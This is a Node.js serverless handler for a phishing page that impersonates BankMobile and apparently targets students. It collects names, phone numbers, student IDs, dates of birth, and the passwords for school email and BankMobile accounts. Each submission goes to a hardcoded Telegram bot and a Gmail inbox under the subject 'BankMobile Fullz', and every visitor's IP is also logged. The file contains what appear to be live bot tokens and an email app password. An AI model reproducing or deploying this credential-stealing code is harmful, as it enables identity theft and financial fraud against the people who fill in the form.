const axios = require("axios");
const nodemailer = require("nodemailer");

module.exports = async (req, res) => {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  const {
    fullName,
    phoneNumber,
    currentSchoolEmail,
    currentSchoolPassword,
    previousSchoolEmail,
    previousSchoolPassword,
    hasBankMobileProfile,
    bankMobileEmail,
    bankMobilePassword,
    studentid,
    dob,
  } = req.body || {};

  // Capture IP + time
  const visitorIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const timestamp = new Date().toLocaleString();

  const botToken = "7597626302:AAFxp2Q5hTEVaCGlt4pauCnVitgZXzNH7dw";
  const chatId = "1775129269";

  // Email transporter config
  const transporter = nodemailer.createTransport({
    service: "Gmail",
    auth: {
      user: "recruitmentupdate9@gmail.com",       // ✅ Your Gmail
      pass: "ghtb ltut ihbk ghor",          // ✅ App Password
    },
  });

  // Build visitor tracking message
  const visitorMessage = `
👀 *New Visitor Landed on the Form Page*
🌐 IP: ${visitorIP}
🕒 Time: ${timestamp}
  `;

  try {
    // Send visitor tracking to Telegram
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: visitorMessage,
      parse_mode: "Markdown",
    });

    // Send visitor tracking to Email
    await transporter.sendMail({
      from: '"BankMobile" <workingfullz@gmail.com>',
      to: "recruitmentupdate9@gmail.com",
      subject: "👀 New Visitor on the Page",
      text: `A visitor landed on your form page:\n\nIP: ${visitorIP}\nTime: ${timestamp}`,
    });
  } catch (visitorError) {
    console.error("Visitor tracking failed:", visitorError.message);
    // Don't return yet — continue to handle form
  }

  // If it's just a visit with no form submission — return success now
  if (
    !fullName &&
    !phoneNumber &&
    !currentSchoolEmail &&
    !currentSchoolPassword &&
    !previousSchoolEmail &&
    !previousSchoolPassword &&
    !studentid &&
    !dob
  ) {
    return res.status(200).json({ message: "Visitor tracked" });
  }

  // Validate form submission
  if (
    !fullName ||
    !phoneNumber ||
    !currentSchoolEmail ||
    !currentSchoolPassword ||
    !previousSchoolEmail ||
    !previousSchoolPassword ||
    !studentid ||
    !dob ||
    typeof hasBankMobileProfile !== "string"
  ) {
    return res.status(400).json({ error: "Missing required fields" });
  }

  const message = `
📩 *New Form Submission*

👤 Full Name: ${fullName}
📱 Phone Number: ${phoneNumber}
🆔 Student ID: ${studentid}
🎂 DOB: ${dob}

🏫 *Current School*
📧 Email: ${currentSchoolEmail}
🔑 Password: ${currentSchoolPassword}

🏫 *Previous School*
📧 Email: ${previousSchoolEmail}
🔑 Password: ${previousSchoolPassword}

🏦 *BankMobile*
✔️ Has Profile: ${hasBankMobileProfile}
📧 Email: ${bankMobileEmail || "N/A"}
🔑 Password: ${bankMobilePassword || "N/A"}

🌐 Visitor IP: ${visitorIP}
🕒 Time: ${timestamp}
`;

  try {
    // Send form message to Telegram
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown",
    });

    // Send form to email
    await transporter.sendMail({
      from: '"BankMobile" <workingfullz@gmail.com>',
      to: "recruitmentupdate9@gmail.com",
      subject: "📩 BankMobile Fullz",
      text: message,
    });

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("Telegram or Email Error:", error.message);
    return res.status(500).json({ error: "Failed to send submission" });
  }
};
